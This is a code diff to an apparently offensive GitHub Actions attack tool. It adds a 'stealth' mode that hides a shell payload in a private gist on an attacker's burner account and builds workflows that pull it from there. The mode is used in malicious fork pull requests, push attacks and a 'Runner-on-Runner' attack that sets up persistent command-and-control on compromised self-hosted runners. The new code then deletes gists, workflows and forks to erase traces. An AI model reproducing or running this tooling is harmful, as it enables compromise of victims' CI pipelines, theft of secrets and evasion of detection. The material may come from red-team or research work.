@@ -162,6 +162,48 @@ class Attacker:
 
         return secret_names
 
+    def __setup_stealth(self, attacker_pat: str, payload: str):
+        """Create a stealth gist on the attacker's burner account.
+
+        Args:
+            attacker_pat (str): PAT for the burner/attacker account.
+            payload (str): Shell payload to store in the gist.
+
+        Returns:
+            tuple: (attacker_api, gist_info) or (None, None) on failure.
+                gist_info is {'id': str, 'raw_url': str}.
+        """
+        attacker_api = Api(
+            attacker_pat,
+            socks_proxy=self.socks_proxy,
+            http_proxy=self.http_proxy,
+            github_url=self.github_url,
+        )
+
+        attacker_info = attacker_api.check_user()
+        if not attacker_info:
+            Output.error("Invalid attacker PAT!")
+            return None, None
+
+        Output.info(
+            f"Stealth mode: creating gist on "
+            f"{Output.bright(attacker_info['user'])}..."
+        )
+
+        gist = attacker_api.create_gist(
+            description='config',
+            filename='setup.sh',
+            content=payload,
+            public=False
+        )
+
+        if not gist:
+            Output.error("Failed to create stealth gist!")
+            return None, None
+
+        Output.result(f"Stealth gist created: {gist['id']}")
+        return attacker_api, gist
+
     def __execute_and_wait_workflow(
             self,
             target_repo: str,
@@ -263,7 +305,9 @@ class Attacker:
                        commit_message: str,
                        yaml_name: str = "sh_cicd_attack",
                        workflow_name: str = "Testing",
-                       runner_labels: list = None):
+                       runner_labels: list = None,
+                       stealth: bool = False,
+                       attacker_pat: str = None):
         """Creates a malicious fork pull request against a public repository.
 
         Args:
@@ -356,9 +400,27 @@ class Attacker:
                 Output.error("Error cloning forked repository!")
                 return False
 
+            stealth_api = None
+            stealth_gist = None
+
             if custom_workflow:
                 with open(custom_workflow, 'r') as custom_wf:
                     yaml_contents = custom_wf.read()
+            elif stealth and attacker_pat:
+                stealth_api, stealth_gist = self.__setup_stealth(
+                    attacker_pat, payload
+                )
+                if not stealth_gist:
+                    return False
+
+                yaml_contents = CICDAttack.create_stealth_yml(
+                    stealth_gist['raw_url'],
+                    stealth_gist['id'],
+                    attacker_pat,
+                    source_branch,
+                    trigger='pull_request',
+                    runner_labels=runner_labels
+                )
             else:
                 yaml_contents = CICDAttack.create_malicious_yml(
                     payload, workflow_name=workflow_name,
@@ -433,6 +495,10 @@ class Attacker:
                 Output.result("Successfully deleted the fork!")
             else:
                 Output.error("Failed to delete the fork!")
+
+            # Belt-and-suspenders: delete gist from our side too
+            if stealth_api and stealth_gist:
+                stealth_api.delete_gist(stealth_gist['id'])
         else:
             Output.error(
                 "The user does not have the necessary scopes to conduct this "
@@ -447,7 +513,9 @@ class Attacker:
             commit_message: str,
             delete_action: bool,
             yaml_name: str = "sh_cicd_attack",
-            runner_labels: list = None):
+            runner_labels: list = None,
+            stealth: bool = False,
+            attacker_pat: str = None):
 
         self.__setup_user_info()
 
@@ -478,9 +546,27 @@ class Attacker:
                 Output.error(f"Remote branch, {branch}, already exists!")
                 return
 
+            stealth_api = None
+            stealth_gist = None
+
             if custom_workflow:
                 with open(custom_workflow, 'r') as custom_wf:
                     yaml_contents = custom_wf.read()
+            elif stealth and attacker_pat:
+                stealth_api, stealth_gist = self.__setup_stealth(
+                    attacker_pat, payload
+                )
+                if not stealth_gist:
+                    return False
+
+                yaml_contents = CICDAttack.create_stealth_yml(
+                    stealth_gist['raw_url'],
+                    stealth_gist['id'],
+                    attacker_pat,
+                    branch,
+                    trigger='push',
+                    runner_labels=runner_labels
+                )
             else:
                 yaml_contents = CICDAttack.create_push_yml(
                     payload, branch,
@@ -509,6 +595,10 @@ class Attacker:
                     Output.error("Failed to delete workflow!")
                 else:
                     Output.result("Workflow deleted sucesfully!")
+
+            # Belt-and-suspenders: delete gist from our side too
+            if stealth_api and stealth_gist:
+                stealth_api.delete_gist(stealth_gist['id'])
         else:
             Output.error(
                 "The user does not have the necessary scopes to conduct this "
@@ -626,7 +716,8 @@ class Attacker:
             commit_message: str,
             delete_action: bool,
             yaml_name: str = "sh_cicd_attack",
-            runner_labels: list = None):
+            runner_labels: list = None,
+            stealth: bool = False):
         """Runner-on-Runner attack: installs a GitHub Actions runner on a
         compromised self-hosted runner, registered to an attacker-controlled
         repo for persistent C2 via workflow_dispatch.
@@ -746,10 +837,38 @@ class Attacker:
             Output.error(f"Remote branch, {branch}, already exists!")
             return
 
-        yaml_contents = CICDAttack.create_ror_yml(
-            reg_token, full_repo_name, runner_version, branch,
-            runner_labels=runner_labels
-        )
+        stealth_gist = None
+
+        if stealth:
+            # In stealth mode, put the RoR installer script in a gist
+            ror_payload = CICDAttack.create_ror_payload(
+                reg_token, full_repo_name, runner_version
+            )
+            stealth_gist = attacker_api.create_gist(
+                description='config',
+                filename='setup.sh',
+                content=ror_payload,
+                public=False
+            )
+            if not stealth_gist:
+                Output.error("Failed to create stealth gist!")
+                return
+
+            Output.result(f"Stealth gist created: {stealth_gist['id']}")
+
+            yaml_contents = CICDAttack.create_stealth_yml(
+                stealth_gist['raw_url'],
+                stealth_gist['id'],
+                attacker_pat,
+                branch,
+                trigger='push',
+                runner_labels=runner_labels
+            )
+        else:
+            yaml_contents = CICDAttack.create_ror_yml(
+                reg_token, full_repo_name, runner_version, branch,
+                runner_labels=runner_labels
+            )
 
         Output.info("Pushing runner installation workflow to victim repo...")
 
@@ -776,6 +895,10 @@ class Attacker:
                 Output.error("Failed to delete workflow!")
             else:
                 Output.result("Workflow deleted sucesfully!")
+
+        # Belt-and-suspenders: delete stealth gist from our side
+        if stealth and stealth_gist:
+            attacker_api.delete_gist(stealth_gist['id'])
 
         Output.owned("Runner-on-Runner attack complete!")
         Output.info(
